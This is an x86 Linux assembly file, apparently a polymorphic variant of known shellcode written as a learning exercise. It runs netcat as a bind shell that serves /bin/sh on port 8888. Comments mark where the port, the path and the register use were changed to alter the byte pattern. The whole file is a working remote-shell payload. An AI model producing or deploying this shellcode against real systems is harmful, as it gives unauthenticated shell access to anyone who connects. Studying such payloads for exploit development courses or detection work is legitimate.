global _start
section .text
 _start:
    xor eax, eax
    xor edx, edx
    push eax
    ; old colde to be changed
    ; push 0x31373737     ;-vp17771
    ; push 0x3170762d

    ; new code the changes the port arguments to "-vvp8888" and uses move to put on stack
    mov dword [esp-4], 0x38383838
    mov dword [esp-8], 0x7076762d
    sub esp, 0x8
    mov esi, esp

    ; change from "push eax" to "push edx" since they both have 0x0
    ; push eax
    push edx

    ; changing the string to include extra "./"'s in the path to /bin/sh
    ;push 0x68732f2f     ;-le//bin//sh
    ;push 0x6e69622f
    ;push 0x2f656c2d
    
    mov dword [esp-4], 0x68732f2f
    mov dword [esp-8], 0x2e2f6e69
    mov dword [esp-12], 0x622f2f2e
    mov dword [esp-16], 0x2f656c2d
    sub esp, 16

    mov edi, esp

    ; change from "push eax" to "push edx" since they both have 0x0
    ; push eax
    push edx

    push 0x636e2f2f     ;/bin//nc
    push 0x6e69622f
    mov ebx, esp

    ; change from "push edx" to "push eax" since they both have 0x0
    ; push edx
    push eax

    push esi
    push edi
    push ebx
    mov ecx, esp
    mov al,11
    int 0x80
